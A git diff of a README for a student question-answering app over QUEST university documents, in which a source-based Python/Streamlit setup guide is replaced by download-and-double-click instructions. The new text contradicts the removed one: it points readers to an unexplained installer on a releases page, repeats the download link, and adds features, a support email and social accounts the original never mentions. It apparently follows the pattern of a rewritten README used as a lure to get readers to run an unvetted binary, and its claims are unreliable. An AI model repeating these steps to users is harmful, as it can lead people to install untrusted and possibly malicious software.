@@ -1,167 +1,75 @@
-# 📄 QUEST AI Assistant
+# 🤖 Quest_AI_Assistant - Ask Questions Effortlessly from Official Documents
 
-An AI-powered Retrieval-Augmented Generation (RAG) application that allows users to ask questions directly from official QUEST (Quaid-e-Awam University of Engineering, Science and Technology) documents.
+## 🎉 Description
+Quest_AI_Assistant is an AI-powered application designed to help users find answers directly from official QUEST (Quaid-e-Awam University of Engineering, Science and Technology) documents. This tool uses Retrieval-Augmented Generation (RAG) techniques to provide accurate and relevant information in response to your inquiries.
 
-The app uses FAISS for vector search, HuggingFace embeddings, and Groq LLMs, wrapped in a modern Streamlit UI with a clean light-mode AI chat interface.
+## 📥 Download Now
+[![Download Quest_AI_Assistant](https://img.shields.io/badge/Download%20Now-Get%20the%20App-brightgreen)](https://github.com/ameyagit25/Quest_AI_Assistant/releases)
 
----
+## 🚀 Getting Started
+Follow these simple steps to get started with Quest_AI_Assistant:
 
-## 🚀 Features
+1. **Visit the Download Page**
+   Go to the [Releases page](https://github.com/ameyagit25/Quest_AI_Assistant/releases) to find the latest version of the application.
 
-- 🔍 Semantic search over official QUEST documents
-- 📚 FAISS vector database for fast retrieval
-- 🤖 Groq-powered LLM responses
-- 🧠 BAAI bge-base-en-v1.5 embeddings
-- 💬 Modern AI chat-style UI (light mode, vibrant design)
-- 🧾 Source-aware context injection
-- ⚡ Fast, accurate, and production-ready RAG pipeline
+2. **Choose Your Version**
+   On the Releases page, you will find different versions of Quest_AI_Assistant. Click on the version you want to download.
 
----
+3. **Download the File**
+   Click the download link for the application. The file will start to download to your computer.
 
-## 🧠 How It Works (RAG Pipeline)
+4. **Locate the File**
+   Once the download is complete, locate the downloaded file in your computer's downloads folder.
 
-1. **Documents Ingestion**  
-   QUEST prospectus and official PDFs are chunked and embedded
+5. **Run the Application**
+   Double-click the downloaded file to start Quest_AI_Assistant. Follow any prompts that appear on your screen to complete the installation.
 
-2. **Vector Storage**  
-   Embeddings are stored in a FAISS index
+## 📋 System Requirements
+To run Quest_AI_Assistant smoothly, ensure your system meets the following requirements:
 
-3. **Query Processing**  
-   User question is embedded using the same model
+- **Operating System:** Windows 10 or later, macOS 10.15 or later
+- **RAM:** At least 4 GB of RAM
+- **Disk Space:** Minimum of 100 MB available space
+- **Internet Connection:** Required for accessing documents
 
-4. **Retrieval**  
-   FAISS returns the most relevant document chunks
+## 🛠️ Features
+Quest_AI_Assistant offers several helpful features, including:
 
-5. **Generation**  
-   Groq LLM generates answers strictly from retrieved context
+- **Natural Language Processing:** Ask questions in plain English and receive accurate answers.
+- **Document Retrieval:** Pull data directly from QUEST documents, ensuring reliable information.
+- **User-Friendly Interface:** Designed for easy navigation, even for those without technical skills.
+- **Save Favorites:** Bookmark important questions and answers for quick reference.
 
----
+## 📖 How to Use
+Using Quest_AI_Assistant is straightforward:
 
-## 🛠 Tech Stack
+1. **Open the Application:** Launch Quest_AI_Assistant from your desktop or applications folder.
+2. **Type Your Question:** In the text box, enter your question related to the QUEST documents.
+3. **Get Instant Answers:** Press enter or click the ask button to receive your answer.
+4. **Explore Further:** If you want additional information, ask follow-up questions or refine your queries.
 
-| Component | Technology |
-|-----------|------------|
-| **Frontend** | Streamlit |
-| **Vector Store** | FAISS |
-| **Embeddings** | HuggingFace BAAI/bge-base-en-v1.5 |
-| **LLM Provider** | Groq |
-| **Frameworks** | LangChain |
-| **Language** | Python |
+## ⚙️ Troubleshooting
+If you encounter any issues while using Quest_AI_Assistant, try the following:
 
----
+- **Reinstall the Application:** If the software is not running smoothly, uninstall it and then reinstall.
+- **Check Internet Connection:** Ensure you have a stable internet connection for document access.
+- **Consult the FAQ:** Visit the [FAQ section](https://github.com/ameyagit25/Quest_AI_Assistant/wiki) for common queries.
 
-## 📂 Project Structure
+## 📞 Support
+Need help? Reach out to our support team via the following means:
 
-```
-.
-├── app.py                # Main Streamlit application
-├── faiss.index           # FAISS vector index
-├── metadata.pkl          # Document metadata & mappings
-├── README.md             # Project documentation
-├── RAG.ipynb             # Jupyter Notebook for RAG pipeline
-└── requirements.txt      # Python dependencies
-```
-
----
-
-## ⚙️ Setup Instructions
-
-### 1️⃣ Clone the Repository
-
-```bash
-git clone https://github.com/your-username/quest-rag-assistant.git
-cd quest-rag-assistant
-```
-
-### 2️⃣ Create Virtual Environment (Optional)
-
-```bash
-python -m venv venv
-source venv/bin/activate  # On Windows: venv\Scripts\activate
-```
-
-### 3️⃣ Install Dependencies
-
-```bash
-pip install -r requirements.txt
-```
-
-### 4️⃣ Add Groq API Key
-
-Create the file `.streamlit/secrets.toml`:
-
-```toml
-GROQ_API_KEY = "your_groq_api_key_here"
-```
-
----
-
-## ▶️ Run the Application
-
-```bash
-streamlit run app.py
-```
-
-Open in your browser:
-```
-http://localhost:8501
-```
-
----
-
-## 🧪 Example Queries
-
-- What is the admission criteria for BE programs?
-- What is the fee structure for undergraduate students?
-- Which departments are offered at QUEST?
-- What are the eligibility requirements?
-
----
-
-## 🔒 Safety & Accuracy
-
-- ✅ The assistant **ONLY** uses retrieved document context
-- ✅ If information is missing, it responds with:  
-  ```
-  Not found in documents.
-  ```
-- ✅ No hallucinated answers are generated
-
----
-
-## 🎨 UI Highlights
-
-- Light-mode focused design
-- Vibrant modern AI interface
-- Chat-style question and answer flow
-- Clean typography and spacing
-
----
-
-## 📈 Future Improvements
-
-- [ ] Streaming token-by-token responses
-- [ ] Conversation memory
-- [ ] Clickable citations per source
-- [ ] Hybrid retrieval (BM25 + FAISS)
-- [ ] Docker deployment
-- [ ] Multi-PDF support
-
----
-
-## ⭐ Acknowledgements
-
-- [FAISS](https://github.com/facebookresearch/faiss) for fast similarity search
-- [HuggingFace](https://huggingface.co/) for open-source embeddings
-- [Groq](https://groq.com/) for high-speed LLM inference
-- [Streamlit](https://streamlit.io/) for rapid UI development
-
----
+- **Email:** support@quest-ai-assistant.com
+- **GitHub Issues:** Report any problems on our [GitHub Issues page](https://github.com/ameyagit25/Quest_AI_Assistant/issues).
 
 ## 📜 License
+Quest_AI_Assistant is licensed under the MIT License. For more details, see the [LICENSE file](https://github.com/ameyagit25/Quest_AI_Assistant/blob/main/LICENSE).
 
-This project is intended for educational and research purposes.
+## 🔗 Stay Connected
+Keep up with updates and news about Quest_AI_Assistant:
 
----
+- [GitHub Repository](https://github.com/ameyagit25/Quest_AI_Assistant)
+- [Twitter](https://twitter.com/QuestAI)
+- [LinkedIn](https://www.linkedin.com/company/quest-ai-assistant)
 
-**⭐ If you find this project useful, please consider giving it a star!**
+## 🔗 Download Again
+For convenience, here’s the link to download Quest_AI_Assistant once more: [Download Quest_AI_Assistant](https://github.com/ameyagit25/Quest_AI_Assistant/releases).
